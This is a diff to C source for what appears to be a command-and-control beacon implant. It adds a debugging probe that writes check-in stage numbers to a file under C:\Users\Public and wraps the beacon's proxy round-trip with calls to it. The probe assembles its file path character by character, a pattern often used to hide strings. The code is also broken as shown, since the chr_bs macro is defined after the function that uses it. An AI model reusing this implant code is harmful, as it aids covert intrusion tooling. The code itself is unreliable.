@@ -31,7 +31,44 @@ extern sessdata bigsession; /* metadata.cpp */
 extern void bof_set_pin(BOOL on);
 extern void bof_unpin(void);
 
+/* crash-localisation probe: append one decimal line to the step file so
+ * the LAST executed stage survives any process death (kernel32 direct -
+ * this runs in normal beacon context, not inside a BOF) */
+void udc2_step_mark(int stage) {
+	char path[30];
+	char num[16];
+	HANDLE h;
+	DWORD w = 0;
+	int i, v;
+
+	path[0]='C'; path[1]=':'; path[2]=chr_bs;
+	path[3]='U'; path[4]='s'; path[5]='e'; path[6]='r'; path[7]='s';
+	path[8]=chr_bs; path[9]='P'; path[10]='u'; path[11]='b'; path[12]='l';
+	path[13]='i'; path[14]='c'; path[15]=chr_bs; path[16]='u'; path[17]='d';
+	path[18]='c'; path[19]='2'; path[20]='_'; path[21]='s'; path[22]='t';
+	path[23]='e'; path[24]='p'; path[25]='.'; path[26]='t'; path[27]='x';
+	path[28]='t'; path[29]=0;
+
+	i = 0;
+	v = stage;
+	if (v < 0) { num[i++]='-'; v = -v; }
+	{
+		char tmp[12];
+		int n = 0;
+		do { tmp[n++] = (char)('0' + (v % 10)); v /= 10; } while (v > 0 && n < 11);
+		while (n > 0) num[i++] = tmp[--n];
+	}
+	num[i++] = 10; /* newline */
+
+	h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (h == INVALID_HANDLE_VALUE)
+		return;
+	WriteFile(h, num, (DWORD)i, &w, NULL);
+	CloseHandle(h);
+}
+
 #define UDC2_MAX_GET (1024 * 1024)
+#define chr_bs 92 /* backslash */
 
 typedef int(*UDC2PROXY)(const char *, int, char *, int);
 typedef void(*UDC2CLOSE)(void);
@@ -85,7 +122,9 @@ static int udc2_round(char * data, int length, char * recv, int max) {
 	udc2.frame[3] = (char)((le >> 24) & 0xff);
 	memcpy(udc2.frame + 4, data, length);
 
+	udc2_step_mark(62200 + (length & 0xFF));
 	rv = udc2.info.proxy(udc2.frame, 4 + length, recv, max);
+	udc2_step_mark(62300 + (rv & 0x7F));
 	if (rv <= 0)
 		return -1;
 
@@ -114,6 +153,8 @@ static int udc2_round(char * data, int length, char * recv, int max) {
 /* the whole checkin cycle: metadata first, then queued blocks, then heartbeat */
 int udc2_cycle(char * recv, int max) {
 	int rv;
+
+	udc2_step_mark(62100 + (udc2.sent_meta ? 1 : 0));
 
 	if (!udc2.sent_meta) {
 		udc2.sent_meta = TRUE;
